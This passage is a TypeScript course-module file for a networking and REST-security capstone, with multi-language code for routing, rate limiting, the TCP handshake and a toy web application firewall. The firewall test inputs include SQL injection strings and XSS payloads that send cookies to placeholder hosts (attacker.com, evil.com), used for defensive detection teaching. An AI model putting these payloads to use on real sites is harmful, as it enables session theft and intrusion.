import { MiniProject } from '../types';

/**
 * Day 7 Capstone Mini-Project: Enterprise Network Packet Sniffer, CIDR Route Analyzer & REST API Security Firewall
 * Module 7: Computer Networks, Protocols & REST Security
 * Mentor: Kapil (SPSU Udaipur Placement Readiness Program)
 */
export const DAY_7_MINI_PROJECT: MiniProject = {
  id: 'day7-mini-project-net-firewall',
  day: 7,
  title: 'Enterprise Network Packet Sniffer, CIDR Route Analyzer & REST API Security Firewall',
  subtitle: 'Full Capstone: Multi-Layer Packet Dissection, LPM Routing Engine, Token Bucket Rate Limiting & REST WAF',
  description:
    'An enterprise-grade network security and protocol analyzer engine. Implements packet header parsing across Ethernet, IPv4, TCP/UDP, and HTTP layers, CIDR subnetting with Longest Prefix Match (LPM) routing table resolution, token bucket rate limiting to mitigate DoS floods, and a REST API Web Application Firewall (WAF) validating HTTP methods, headers, and payload signatures.',
  features: [
    'Multi-Layer Packet Header Dissection (Ethernet L2, IPv4 L3, TCP/UDP L4, HTTP L7)',
    'CIDR Subnetting & Longest Prefix Match (LPM) Route Forwarding Engine',
    'Token Bucket Traffic Shaper & Rate Limiter to Defend Against DoS / SYN Floods',
    'REST API Web Application Firewall (WAF) Validating Method Idempotency & SQLi / XSS Payloads',
    'TCP 3-Way Handshake Connection Lifecycle Simulator (SYN, SYN-ACK, ACK, FIN)',
  ],
  conceptsCovered: {
    dataTypes: [
      'struct EthernetHeader { srcMac[6], dstMac[6], etherType }',
      'struct IPv4Header { version, ihl, tos, totalLen, id, ttl, protocol, srcIP, dstIP }',
      'struct TCPHeader { srcPort, dstPort, seqNum, ackNum, dataOffset, flags, windowSize }',
      'struct RouteEntry { networkIP, prefixLength, subnetMask, nextHop, interfaceName }',
      'struct WAFRule { pattern, method, action, violationReason }',
    ],
    conditionals: [
      'if (packet.protocol == 6) -> parseTCP() else if (packet.protocol == 17) -> parseUDP()',
      'if ((destIP & route.mask) == (route.network & route.mask) && route.prefix > bestPrefix) -> updateLPM()',
      'if (currentTokens >= packetCost) -> allowPacket() else -> dropPacketRateExceeded()',
      'if (method == "POST" && isIdempotencyKeyMissing) -> enforceIdempotency()',
      'if (payload.matches(SQLI_REGEX) || payload.matches(XSS_REGEX)) -> triggerWAFBlock()',
    ],
    loops: [
      'Byte-by-Byte Packet Header Deserialization & Checksum Computation',
      'LPM Linear & Trie-Based Route Lookup across Kernel Routing Table',
      'Token Bucket Continuous Refill Simulation based on Delta Milliseconds',
      'TCP Sliding Window Segment Acknowledgment & Buffer Tracking',
    ],
    constraints: [
      'O(1) Bitwise Subnet Mask Shifts & 32-bit Integer IP Arithmetic',
      'Zero Memory Leaks: In-place buffer parsing without dynamic allocation on hot path',
      'RFC 9110 HTTP Compliance: Safe methods strictly enforce read-only resource access',
      'RFC 3021 Point-to-Point /31 subnet handling and /32 host routing',
    ],
  },
  complexity: {
    basicOperations: 'O(1) CIDR Subnet Mask Bitwise Calculation & Port Mapping',
    powerCalculation: 'O(N) Longest Prefix Match Route Lookup (N = routing table entries)',
    menuDisplay: 'O(1) Token Bucket Constant-Time Refill & Rate Limit Check',
    auxiliarySpace: 'O(R + P) Space for Routing Table Entries & In-Flight Packet Buffer',
  },
  educationalNotes: [
    {
      number: 1,
      title: 'The TCP 3-Way Handshake, SYN Flood Attacks & SYN Cookies',
      details:
        'To establish a reliable full-duplex TCP socket connection, the client and server exchange 3 packets: Client sends SYN(seq=x); Server replies with SYN-ACK(seq=y, ack=x+1); Client concludes with ACK(ack=y+1). In a SYN Flood DoS attack, an attacker exhausts the server\'s half-open connection backlog by sending endless SYNs and never replying with the final ACK. Modern OS kernels defend using SYN Cookies—encoding TCP state into the Initial Sequence Number (ISN) cryptographically, avoiding memory allocation until the final ACK arrives.',
    },
    {
      number: 2,
      title: 'CIDR Subnetting Mathematics & Longest Prefix Match (LPM) Routing',
      details:
        'Classless Inter-Domain Routing (CIDR) replaced rigid Class A/B/C networks with variable-length prefix masks (/1 to /32). A subnet mask with prefix /N has N leading 1-bits and (32 - N) trailing 0-bits: mask = ~((1 << (32 - N)) - 1). Routers determine packet egress by comparing the destination IP against all routes: (dest_ip & route_mask) == route_network. If multiple routes match, the router forwards out the interface with the Longest Prefix Match (highest prefix length N) because it represents the most specific host or subnet.',
    },
    {
      number: 3,
      title: 'REST Architectural Constraints & HTTP Idempotency Semantics',
      details:
        'Roy Fielding\'s REST architectural style mandates: Client-Server separation, Statelessness, Cacheability, Uniform Interface, Layered System, and Code on Demand. In HTTP/1.1 and HTTP/2: Safe methods (GET, HEAD, OPTIONS) must never alter server resource state. Idempotent methods (GET, HEAD, PUT, DELETE) guarantee that N identical requests produce the same server resource state as 1 request. POST and PATCH are not idempotent by default; enterprise payment APIs require client-generated "Idempotency-Key" UUID headers to prevent duplicate credit card charges.',
    },
    {
      number: 4,
      title: 'Web Application Firewall (WAF) Security: Defense Against SQLi & XSS',
      details:
        'Layer 7 Application Firewalls inspect HTTP request lines, headers, cookies, and JSON/form payloads. SQL Injection (SQLi) occurs when untrusted input concatenates directly into database queries (e.g., "\' OR \'1\'=\'1"). Cross-Site Scripting (XSS) occurs when malicious JavaScript executes in a victim\'s browser due to unescaped user input (e.g., "<script>stealCookies()</script>"). Enterprise firewalls block suspicious patterns, enforce Content-Security-Policy (CSP) headers, and require parameterized prepared statements.',
    },
  ],
  interactiveScenarios: [
    {
      id: 'sc1',
      name: 'Multi-Layer Packet Dissection (Ethernet L2 -> IPv4 L3 -> TCP L4 -> HTTP L7)',
      choice: 1,
      description: 'Dissect a synthetic 64-byte raw packet through OSI Layers 2, 3, 4, and 7 to inspect MAC, IP, Ports, and HTTP payload.',
      sampleInputs: ['Src: 192.168.1.10:52414', 'Dst: 104.21.32.1:443', 'Protocol: TCP', 'Flags: [ACK, PSH]'],
      expectedOutput: 'L2 Ethernet: ARP/IP Frame | L3 IPv4: TTL=64, Checksum=0x4A12 | L4 TCP: Port 52414 -> 443 (HTTPS) | L7 HTTP: Encrypted TLS 1.3 Record (Application Data)',
      explanation: 'Demultiplexing occurs layer by layer: EtherType 0x0800 hands to IPv4; IP Protocol 6 hands to TCP; TCP Destination Port 443 hands to TLS/HTTPS.',
    },
    {
      id: 'sc2',
      name: 'Routing Table Longest Prefix Match (LPM) Forwarding Engine',
      choice: 2,
      description: 'Route destination IP 192.168.1.75 across a core router table containing /0 default, /16 campus, and /24 lab subnets.',
      sampleInputs: ['Routes: [0.0.0.0/0 gw0], [192.168.0.0/16 eth0], [192.168.1.0/24 eth1]', 'Dest: 192.168.1.75'],
      expectedOutput: 'MATCHES: 0.0.0.0/0 (len 0), 192.168.0.0/16 (len 16), 192.168.1.0/24 (len 24) -> SELECTED: eth1 (Prefix /24 - Longest Match)',
      explanation: 'All 3 routes logically encompass the destination IP, but /24 provides the most specific network path and is chosen by the forwarding plane.',
    },
    {
      id: 'sc3',
      name: 'Token Bucket Rate Limiting & DoS Burst Traffic Shaping',
      choice: 3,
      description: 'Simulate high-volume API requests under a Token Bucket policy (Capacity: 10 tokens, Refill: 2 tokens/sec, Request Cost: 1 token).',
      sampleInputs: ['Bucket: Capacity=10, Rate=2/s', 'Traffic: Burst 15 requests at t=0s, followed by 3 requests at t=2s'],
      expectedOutput: 't=0s: Packets 1-10 [ALLOWED: 200 OK], Packets 11-15 [DROPPED: 429 Too Many Requests] | t=2s: 4 Tokens refilled -> Packets 16-18 [ALLOWED]',
      explanation: 'Token bucket absorbs legitimate traffic bursts up to capacity 10, then clamps subsequent requests to the steady refill rate, dropping malicious floods.',
    },
    {
      id: 'sc4',
      name: 'REST API Web Application Firewall (WAF) Security Scanner',
      choice: 4,
      description: 'Inspect incoming HTTP requests for method safety, idempotency compliance, and malicious SQLi / XSS injection vectors.',
      sampleInputs: ['Req 1: GET /api/v1/students?dept=CSE', 'Req 2: POST /api/v1/login (body: admin\' OR 1=1--)', 'Req 3: POST /api/v1/comment (body: <script>alert(1)</script>)'],
      expectedOutput: 'Req 1: [PASS - 200 OK Safe Read] | Req 2: [BLOCKED - 403 Forbidden: SQL Injection Pattern Detected] | Req 3: [BLOCKED - 403 Forbidden: XSS Payload Neutralized]',
      explanation: 'The WAF performs signature matching against known injection vectors, preventing malicious payloads from ever reaching application code or the database.',
    },
    {
      id: 'sc5',
      name: 'TCP 3-Way Handshake & Connection Teardown State Machine',
      choice: 5,
      description: 'Trace TCP socket states: LISTEN -> SYN_SENT -> SYN_RCVD -> ESTABLISHED -> FIN_WAIT_1 -> CLOSE_WAIT -> LAST_ACK -> TIME_WAIT -> CLOSED.',
      sampleInputs: ['Client Initial Seq: 1000', 'Server Initial Seq: 5000'],
      expectedOutput: 'SYN(seq=1000) -> SYN-ACK(seq=5000, ack=1001) -> ACK(seq=1001, ack=5001) -> [STATE: ESTABLISHED] -> FIN(seq=1001) -> ACK(ack=1002) -> [STATE: TIME_WAIT (2*MSL)]',
      explanation: 'Sequence numbers advance by 1 for control flags (SYN, FIN) and by the number of payload bytes during data transmission. 2*MSL prevents delayed duplicate packets.',
    },
  ],
  codeByLanguage: {
    c: `#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>

#define MAX_ROUTES 16

typedef struct {
    char cidr[32];
    uint32_t network;
    int prefix;
    uint32_t mask;
    char iface[16];
} RouteEntry;

typedef struct {
    int capacity;
    int refillRate;
    long currentTokens;
} TokenBucket;

uint32_t parseIPv4(const char *ipStr) {
    unsigned int a, b, c, d;
    if (sscanf(ipStr, "%u.%u.%u.%u", &a, &b, &c, &d) != 4) return 0;
    return ((uint32_t)a << 24) | ((uint32_t)b << 16) | ((uint32_t)c << 8) | (uint32_t)d;
}

void runScenario1() {
    printf("\\n=== [SCENARIO 1] MULTI-LAYER PACKET DISSECTION ===\\n");
    printf("[L2 Data Link] Frame Type: Ethernet II (0x0800 IPv4)\\n");
    printf("               Src MAC: 00:1A:2B:3C:4D:5E -> Dst MAC: AA:BB:CC:DD:EE:FF\\n");
    printf("[L3 Network]   Protocol: IPv4 | Total Length: 64 bytes | TTL: 64\\n");
    printf("               Src IP: 192.168.1.10 -> Dst IP: 104.21.32.1 (Cloudflare Edge)\\n");
    printf("[L4 Transport] Protocol: TCP (6) | Src Port: 52414 -> Dst Port: 443 (HTTPS)\\n");
    printf("               Seq: 1000 | Ack: 5001 | Flags: [ACK, PSH] | Window: 65535\\n");
    printf("[L7 App Layer] Encrypted Payload: TLS 1.3 Record (Application Data, 24 bytes)\\n");
    printf("RESULT: Packet verified intact, valid IP/TCP checksums.\\n");
}

void runScenario2() {
    printf("\\n=== [SCENARIO 2] ROUTING TABLE LONGEST PREFIX MATCH (LPM) ===\\n");
    RouteEntry table[4] = {
        {"0.0.0.0/0", 0, 0, 0, "default_gw"},
        {"10.0.0.0/8", parseIPv4("10.0.0.0"), 8, 0xFF000000, "eth0_internal"},
        {"192.168.0.0/16", parseIPv4("192.168.0.0"), 16, 0xFFFF0000, "eth1_campus"},
        {"192.168.1.0/24", parseIPv4("192.168.1.0"), 24, 0xFFFFFF00, "eth2_cs_lab"}
    };

    const char *testIPStr = "192.168.1.75";
    uint32_t dest = parseIPv4(testIPStr);
    printf("Incoming Destination IP: %s (0x%08X)\\n", testIPStr, dest);

    int bestPrefix = -1, bestIdx = -1;
    for (int i = 0; i < 4; i++) {
        uint32_t net = table[i].network & table[i].mask;
        uint32_t destMasked = dest & table[i].mask;
        bool match = (destMasked == net);
        printf("  Evaluating Route [%-16s]: %s (Prefix /%d)\\n", 
               table[i].cidr, match ? "MATCH " : "NO-MATCH", table[i].prefix);
        if (match && table[i].prefix > bestPrefix) {
            bestPrefix = table[i].prefix;
            bestIdx = i;
        }
    }
    printf(">> FORWARDING DECISION: Interface '%s' via %s (Prefix /%d)\\n", 
           table[bestIdx].iface, table[bestIdx].cidr, bestPrefix);
}

void runScenario3() {
    printf("\\n=== [SCENARIO 3] TOKEN BUCKET RATE LIMITER (DoS DEFENSE) ===\\n");
    TokenBucket tb = {10, 2, 10};
    printf("Config: Capacity = %d tokens, Refill Rate = %d tokens/sec\\n", tb.capacity, tb.refillRate);
    printf("\\n--- Burst 12 Packets at t=0s ---\\n");
    for (int i = 1; i <= 12; i++) {
        if (tb.currentTokens >= 1) {
            tb.currentTokens--;
            printf("  Packet %2d (t=0s): [PASS] 200 OK | Remaining Tokens: %ld\\n", i, tb.currentTokens);
        } else {
            printf("  Packet %2d (t=0s): [DROP] 429 Too Many Requests | Rate Exceeded!\\n", i);
        }
    }
    printf("\\n--- Time Advances 2 Seconds (t=2s) ---\\n");
    tb.currentTokens += 2 * tb.refillRate;
    if (tb.currentTokens > tb.capacity) tb.currentTokens = tb.capacity;
    printf("Tokens refilled: +4 tokens (Current: %ld)\\n", tb.currentTokens);
    for (int i = 13; i <= 15; i++) {
        if (tb.currentTokens >= 1) {
            tb.currentTokens--;
            printf("  Packet %2d (t=2s): [PASS] 200 OK | Remaining Tokens: %ld\\n", i, tb.currentTokens);
        } else {
            printf("  Packet %2d (t=2s): [DROP] 429 Too Many Requests\\n", i);
        }
    }
}

void runScenario4() {
    printf("\\n=== [SCENARIO 4] REST API WEB APPLICATION FIREWALL (WAF) ===\\n");
    const char *requests[][3] = {
        {"GET", "/api/v1/students?dept=CSE", "None"},
        {"POST", "/api/v1/login", "username=admin' OR '1'='1'--&pass=x"},
        {"POST", "/api/v1/comments", "<script>alert(document.cookie)</script>"},
        {"PUT", "/api/v1/grades/101", "{\\"grade\\": \\"A+\\"}"}
    };
    for (int i = 0; i < 4; i++) {
        const char *method = requests[i][0];
        const char *uri = requests[i][1];
        const char *body = requests[i][2];
        printf("\\nInspect Request #%d: %s %s\\n", i + 1, method, uri);
        bool isSafe = (strcmp(method, "GET") == 0 || strcmp(method, "HEAD") == 0);
        bool isIdempotent = (isSafe || strcmp(method, "PUT") == 0 || strcmp(method, "DELETE") == 0);
        printf("  REST Semantics: Safe=%s | Idempotent=%s\\n", isSafe ? "YES" : "NO", isIdempotent ? "YES" : "NO");
        if (strstr(body, "OR '1'='1'") || strstr(body, "' OR '") || strstr(body, "--")) {
            printf("  >> [WAF ALERT - BLOCKED] Status 403 Forbidden! Violation: SQL Injection Attack Detected\\n");
        } else if (strstr(body, "<script>") || strstr(body, "javascript:")) {
            printf("  >> [WAF ALERT - BLOCKED] Status 403 Forbidden! Violation: Stored Cross-Site Scripting (XSS)\\n");
        } else {
            printf("  >> [WAF STATUS - PASSED] Status 200 OK. Clean payload forwarded to backend microservice.\\n");
        }
    }
}

void runScenario5() {
    printf("\\n=== [SCENARIO 5] TCP 3-WAY HANDSHAKE & TEARDOWN LIFECYCLE ===\\n");
    uint32_t clientISN = 1000;
    uint32_t serverISN = 5000;
    printf("1. Client sends: [SYN]       seq=%u, ack=0      (Client State: SYN_SENT)\\n", clientISN);
    printf("2. Server sends: [SYN, ACK]  seq=%u, ack=%u   (Server State: SYN_RCVD)\\n", serverISN, clientISN + 1);
    printf("3. Client sends: [ACK]       seq=%u, ack=%u   (Both States: ESTABLISHED)\\n", clientISN + 1, serverISN + 1);
    printf("   --- Bi-directional Full-Duplex Data Transmission Active ---\\n");
    printf("4. Client sends: [FIN, ACK]  seq=%u, ack=%u   (Client State: FIN_WAIT_1)\\n", clientISN + 1, serverISN + 1);
    printf("5. Server sends: [ACK]       seq=%u, ack=%u   (Server State: CLOSE_WAIT)\\n", serverISN + 1, clientISN + 2);
    printf("6. Server sends: [FIN, ACK]  seq=%u, ack=%u   (Server State: LAST_ACK)\\n", serverISN + 1, clientISN + 2);
    printf("7. Client sends: [ACK]       seq=%u, ack=%u   (Client State: TIME_WAIT 2*MSL)\\n", clientISN + 2, serverISN + 2);
    printf("RESULT: TCP Connection cleanly closed without socket leakage.\\n");
}

int main() {
    printf("================================================================================\\n");
    printf("  SPSU UDAIPUR - ENTERPRISE NETWORK PACKET SNIFFER & REST SECURITY FIREWALL\\n");
    printf("  Module 7 Capstone Engine | Placement Mentor: Kapil | Academic Year 2026\\n");
    printf("================================================================================\\n");
    runScenario1();
    runScenario2();
    runScenario3();
    runScenario4();
    runScenario5();
    printf("\\n================================================================================\\n");
    printf("  ALL 5 NETWORK & REST SECURITY SCENARIOS SUCCESSFULLY SIMULATED\\n");
    printf("================================================================================\\n");
    return 0;
}`,
    cpp: `#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <cstdint>
#include <iomanip>
#include <algorithm>

using namespace std;

struct RouteEntry {
    string cidr;
    uint32_t network;
    int prefix;
    uint32_t mask;
    string iface;
};

uint32_t parseIP(const string &ip) {
    stringstream ss(ip);
    string token;
    uint32_t res = 0;
    while (getline(ss, token, '.')) res = (res << 8) | stoi(token);
    return res;
}

class TokenBucket {
private:
    long capacity;
    long refillRate;
    long currentTokens;
public:
    TokenBucket(long cap, long rate) : capacity(cap), refillRate(rate), currentTokens(cap) {}

    bool allowRequest(long cost = 1) {
        if (currentTokens >= cost) {
            currentTokens -= cost;
            return true;
        }
        return false;
    }

    void refill(long seconds) {
        currentTokens = min(capacity, currentTokens + seconds * refillRate);
    }

    long getTokens() const { return currentTokens; }
};

int main() {
    cout << "================================================================================" << endl;
    cout << "  SPSU UDAIPUR - ENTERPRISE NETWORK PACKET SNIFFER & REST SECURITY FIREWALL" << endl;
    cout << "  Module 7 Capstone Engine (C++20) | Placement Mentor: Kapil" << endl;
    cout << "================================================================================" << endl;

    // Scenario 1: Multi-Layer Packet Dissection
    cout << "\\n=== [SCENARIO 1] MULTI-LAYER PACKET DISSECTION ===" << endl;
    cout << "L2 Ethernet Frame: 0x0800 (IPv4) | MAC: 00:1A:2B:3C:4D:5E -> AA:BB:CC:DD:EE:FF" << endl;
    cout << "L3 IPv4 Header: Src=192.168.1.10 -> Dst=104.21.32.1 | TTL=64 | Protocol=6 (TCP)" << endl;
    cout << "L4 TCP Segment: Port 52414 -> 443 (HTTPS) | Seq=1000 | Ack=5001 | Flags=[ACK, PSH]" << endl;
    cout << "L7 TLS 1.3 Record: 24 bytes Application Data (AES-256-GCM Encrypted)" << endl;

    // Scenario 2: Routing Table Longest Prefix Match
    cout << "\\n=== [SCENARIO 2] ROUTING TABLE LONGEST PREFIX MATCH (LPM) ===" << endl;
    vector<RouteEntry> table = {
        {"0.0.0.0/0", 0, 0, 0, "default_gw"},
        {"10.0.0.0/8", parseIP("10.0.0.0"), 8, 0xFF000000, "eth0_internal"},
        {"192.168.0.0/16", parseIP("192.168.0.0"), 16, 0xFFFF0000, "eth1_campus"},
        {"192.168.1.0/24", parseIP("192.168.1.0"), 24, 0xFFFFFF00, "eth2_cs_lab"}
    };

    string destStr = "192.168.1.75";
    uint32_t dest = parseIP(destStr);
    int bestPrefix = -1;
    string bestIface = "";
    for (const auto &r : table) {
        if ((dest & r.mask) == (r.network & r.mask)) {
            cout << "  Candidate Match: " << setw(16) << left << r.cidr << " -> Interface: " << r.iface << endl;
            if (r.prefix > bestPrefix) {
                bestPrefix = r.prefix;
                bestIface = r.iface;
            }
        }
    }
    cout << ">> FORWARDING DECISION: Dest " << destStr << " -> Interface: " << bestIface 
         << " (Prefix /" << bestPrefix << ")" << endl;

    // Scenario 3: Token Bucket Rate Limiter
    cout << "\\n=== [SCENARIO 3] TOKEN BUCKET RATE LIMITER ===" << endl;
    TokenBucket bucket(10, 2);
    for (int i = 1; i <= 12; i++) {
        if (bucket.allowRequest(1)) {
            cout << "  Req #" << setw(2) << i << ": [PASS] 200 OK | Remaining Tokens: " << bucket.getTokens() << endl;
        } else {
            cout << "  Req #" << setw(2) << i << ": [DROP] 429 Too Many Requests (Rate Clamped)" << endl;
        }
    }
    cout << "Refilling +4 tokens after 2 seconds..." << endl;
    bucket.refill(2);
    cout << "Refilled Tokens: " << bucket.getTokens() << endl;

    // Scenario 4: REST API WAF Firewall
    cout << "\\n=== [SCENARIO 4] REST API WEB APPLICATION FIREWALL (WAF) ===" << endl;
    vector<pair<string, string>> payloads = {
        {"GET /api/v1/students?dept=CSE", "None"},
        {"POST /api/v1/login", "user=admin' OR '1'='1'--"},
        {"POST /api/v1/feedback", "<script>fetch('http://attacker.com?c='+document.cookie)</script>"}
    };
    for (const auto &p : payloads) {
        cout << "Request: " << p.first << endl;
        if (p.second.find("' OR '1'='1'") != string::npos || p.second.find("--") != string::npos) {
            cout << "  >> [WAF BLOCKED 403 Forbidden]: SQL Injection Pattern Detected!" << endl;
        } else if (p.second.find("<script>") != string::npos) {
            cout << "  >> [WAF BLOCKED 403 Forbidden]: Cross-Site Scripting (XSS) Detected!" << endl;
        } else {
            cout << "  >> [WAF PASSED 200 OK]: Request forwarded to upstream service." << endl;
        }
    }

    // Scenario 5: TCP 3-Way Handshake
    cout << "\\n=== [SCENARIO 5] TCP 3-WAY HANDSHAKE STATE MACHINE ===" << endl;
    cout << "1. [SYN]      seq=1000, ack=0      -> State: SYN_SENT" << endl;
    cout << "2. [SYN, ACK] seq=5000, ack=1001   -> State: SYN_RCVD" << endl;
    cout << "3. [ACK]      seq=1001, ack=5001   -> State: ESTABLISHED" << endl;
    cout << "4. [FIN]      seq=1001, ack=5001   -> State: FIN_WAIT_1 -> TIME_WAIT (2*MSL)" << endl;
    cout << "Connection cleanly terminated without resource leaks." << endl;

    return 0;
}`,
    java: `import java.util.*;

public class EnterpriseNetworkFirewall {
    static class Route {
        String cidr;
        long network;
        int prefix;
        long mask;
        String iface;

        Route(String cidr, String ipStr, int prefix, String iface) {
            this.cidr = cidr;
            this.prefix = prefix;
            this.mask = prefix == 0 ? 0L : (0xFFFFFFFFL << (32 - prefix)) & 0xFFFFFFFFL;
            this.network = parseIP(ipStr) & this.mask;
            this.iface = iface;
        }
    }

    static long parseIP(String ip) {
        String[] parts = ip.split("\\\\.");
        long res = 0;
        for (String p : parts) res = (res << 8) | Integer.parseInt(p);
        return res;
    }

    static class TokenBucket {
        long capacity;
        long refillRate;
        long currentTokens;

        TokenBucket(long capacity, long refillRate) {
            this.capacity = capacity;
            this.refillRate = refillRate;
            this.currentTokens = capacity;
        }

        synchronized boolean allowRequest(long cost) {
            if (currentTokens >= cost) {
                currentTokens -= cost;
                return true;
            }
            return false;
        }

        synchronized void refill(long seconds) {
            currentTokens = Math.min(capacity, currentTokens + seconds * refillRate);
        }
    }

    public static void main(String[] args) {
        System.out.println("================================================================================");
        System.out.println("  SPSU UDAIPUR - ENTERPRISE NETWORK PACKET SNIFFER & REST SECURITY FIREWALL");
        System.out.println("  Module 7 Capstone Engine (Java 21) | Placement Mentor: Kapil");
        System.out.println("================================================================================");

        // Scenario 1: Multi-Layer Packet Dissection
        System.out.println("\\n=== [SCENARIO 1] MULTI-LAYER PACKET DISSECTION ===");
        System.out.println("L2: Ethernet II (0x0800 IPv4) | MAC: 00:1A:2B:3C:4D:5E -> AA:BB:CC:DD:EE:FF");
        System.out.println("L3: IPv4 | TotalLen=64 | TTL=64 | Src=192.168.1.10 -> Dst=104.21.32.1");
        System.out.println("L4: TCP (6) | SrcPort=52414 -> DstPort=443 | Flags=[ACK, PSH] | Window=65535");
        System.out.println("L7: TLS 1.3 Record Layer | Application Data (AES-256-GCM Encrypted)");

        // Scenario 2: Longest Prefix Match
        System.out.println("\\n=== [SCENARIO 2] ROUTING TABLE LONGEST PREFIX MATCH (LPM) ===");
        List<Route> routes = List.of(
            new Route("0.0.0.0/0", "0.0.0.0", 0, "default_gw"),
            new Route("10.0.0.0/8", "10.0.0.0", 8, "eth0_internal"),
            new Route("192.168.0.0/16", "192.168.0.0", 16, "eth1_campus"),
            new Route("192.168.1.0/24", "192.168.1.0", 24, "eth2_cs_lab")
        );
        String targetIP = "192.168.1.75";
        long dest = parseIP(targetIP);
        Route best = null;
        for (Route r : routes) {
            if ((dest & r.mask) == r.network) {
                System.out.printf("  Matching Route: %-16s -> Iface: %s%n", r.cidr, r.iface);
                if (best == null || r.prefix > best.prefix) best = r;
            }
        }
        System.out.printf(">> FORWARDING DECISION: Dest %s forwarded to Interface '%s' (Prefix /%d)%n",
                          targetIP, best.iface, best.prefix);

        // Scenario 3: Token Bucket Rate Limiter
        System.out.println("\\n=== [SCENARIO 3] TOKEN BUCKET RATE LIMITER ===");
        TokenBucket tb = new TokenBucket(10, 2);
        for (int i = 1; i <= 12; i++) {
            if (tb.allowRequest(1)) {
                System.out.println("  Packet #" + i + ": [PASS] 200 OK | Remaining: " + tb.currentTokens);
            } else {
                System.out.println("  Packet #" + i + ": [DROP] 429 Too Many Requests | Rate Limited!");
            }
        }
        tb.refill(2);
        System.out.println("Refilled 4 tokens at t=2s. New Balance: " + tb.currentTokens);

        // Scenario 4: REST API WAF Firewall
        System.out.println("\\n=== [SCENARIO 4] REST API WEB APPLICATION FIREWALL (WAF) ===");
        String[] payloads = {
            "dept=CSE",
            "username=admin' OR '1'='1'--",
            "<script>alert(document.cookie)</script>"
        };
        for (String p : payloads) {
            if (p.contains("' OR '1'='1'") || p.contains("--")) {
                System.out.println("  Payload: \\"" + p + "\\" -> [BLOCKED 403 Forbidden] SQL Injection Attack");
            } else if (p.contains("<script>")) {
                System.out.println("  Payload: \\"" + p + "\\" -> [BLOCKED 403 Forbidden] Cross-Site Scripting (XSS)");
            } else {
                System.out.println("  Payload: \\"" + p + "\\" -> [PASSED 200 OK] Clean Request Forwarded");
            }
        }

        // Scenario 5: TCP Handshake
        System.out.println("\\n=== [SCENARIO 5] TCP 3-WAY HANDSHAKE STATE MACHINE ===");
        System.out.println("1. Client -> SYN (seq=1000) -> SYN_SENT");
        System.out.println("2. Server -> SYN-ACK (seq=5000, ack=1001) -> SYN_RCVD");
        System.out.println("3. Client -> ACK (seq=1001, ack=5001) -> ESTABLISHED");
        System.out.println("4. Teardown: FIN -> ACK -> FIN -> ACK -> TIME_WAIT (2*MSL)");
    }
}`,
    python: `import sys

def parse_ip(ip: str) -> int:
    parts = [int(x) for x in ip.split(".")]
    return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]

class TokenBucket:
    def __init__(self, capacity: int, refill_rate: int):
        self.capacity = capacity
        self.refill_rate = refill_rate
        self.current_tokens = float(capacity)

    def allow_request(self, cost: int = 1) -> bool:
        if self.current_tokens >= cost:
            self.current_tokens -= cost
            return True
        return False

    def refill(self, seconds: float):
        self.current_tokens = min(self.capacity, self.current_tokens + seconds * self.refill_rate)

def main():
    print("=" * 80)
    print("  SPSU UDAIPUR - ENTERPRISE NETWORK PACKET SNIFFER & REST SECURITY FIREWALL")
    print("  Module 7 Capstone Engine (Python 3.12) | Placement Mentor: Kapil")
    print("=" * 80)

    # Scenario 1: Multi-Layer Packet Dissection
    print("\\n=== [SCENARIO 1] MULTI-LAYER PACKET DISSECTION ===")
    print("L2 Ethernet Frame: Type=0x0800 (IPv4) | MAC: 00:1A:2B:3C:4D:5E -> AA:BB:CC:DD:EE:FF")
    print("L3 IPv4 Header: Src=192.168.1.10 -> Dst=104.21.32.1 | TTL=64 | Protocol=6 (TCP)")
    print("L4 TCP Segment: Port 52414 -> 443 (HTTPS) | Seq=1000 | Ack=5001 | Flags=[ACK, PSH]")
    print("L7 TLS 1.3 Record: 24 bytes Application Data (AES-256-GCM Encrypted)")

    # Scenario 2: Routing Table Longest Prefix Match (LPM)
    print("\\n=== [SCENARIO 2] ROUTING TABLE LONGEST PREFIX MATCH (LPM) ===")
    routes = [
        ("0.0.0.0/0", "0.0.0.0", 0, "default_gw"),
        ("10.0.0.0/8", "10.0.0.0", 8, "eth0_internal"),
        ("192.168.0.0/16", "192.168.0.0", 16, "eth1_campus"),
        ("192.168.1.0/24", "192.168.1.0", 24, "eth2_cs_lab"),
    ]
    dest_ip_str = "192.168.1.75"
    dest_ip = parse_ip(dest_ip_str)

    best_prefix = -1
    best_route = None
    for cidr, net_str, prefix, iface in routes:
        mask = (0xFFFFFFFF << (32 - prefix)) & 0xFFFFFFFF if prefix > 0 else 0
        net = parse_ip(net_str) & mask
        if (dest_ip & mask) == net:
            print(f"  Candidate Match: {cidr:<16} -> Interface: {iface}")
            if prefix > best_prefix:
                best_prefix = prefix
                best_route = (cidr, iface)

    print(f">> FORWARDING DECISION: Dest {dest_ip_str} -> Interface: {best_route[1]} (Prefix /{best_prefix})")

    # Scenario 3: Token Bucket Rate Limiter
    print("\\n=== [SCENARIO 3] TOKEN BUCKET RATE LIMITER ===")
    bucket = TokenBucket(capacity=10, refill_rate=2)
    for i in range(1, 13):
        if bucket.allow_request(1):
            print(f"  Req #{i:2d}: [PASS] 200 OK | Remaining Tokens: {int(bucket.current_tokens)}")
        else:
            print(f"  Req #{i:2d}: [DROP] 429 Too Many Requests (Clamped by Token Bucket)")
    bucket.refill(2.0)
    print(f"Refilled +4 tokens after 2s. Current balance: {int(bucket.current_tokens)}")

    # Scenario 4: REST API WAF Firewall
    print("\\n=== [SCENARIO 4] REST API WEB APPLICATION FIREWALL (WAF) ===")
    test_cases = [
        ("GET", "/api/v1/students?dept=CSE", ""),
        ("POST", "/api/v1/login", "user=admin' OR '1'='1'--"),
        ("POST", "/api/v1/comments", "<script>fetch('http://evil.com?c='+document.cookie)</script>"),
    ]
    for method, path, payload in test_cases:
        is_safe = method in ["GET", "HEAD"]
        is_idempotent = is_safe or method in ["PUT", "DELETE"]
        print(f"Request: {method} {path} (Safe={is_safe}, Idempotent={is_idempotent})")
        if "' OR '1'='1'" in payload or "--" in payload:
            print("  >> [WAF BLOCKED 403 Forbidden] SQL Injection Attack Detected!")
        elif "<script>" in payload:
            print("  >> [WAF BLOCKED 403 Forbidden] Cross-Site Scripting (XSS) Detected!")
        else:
            print("  >> [WAF PASSED 200 OK] Request clean and forwarded to backend.")

    # Scenario 5: TCP 3-Way Handshake
    print("\\n=== [SCENARIO 5] TCP 3-WAY HANDSHAKE STATE MACHINE ===")
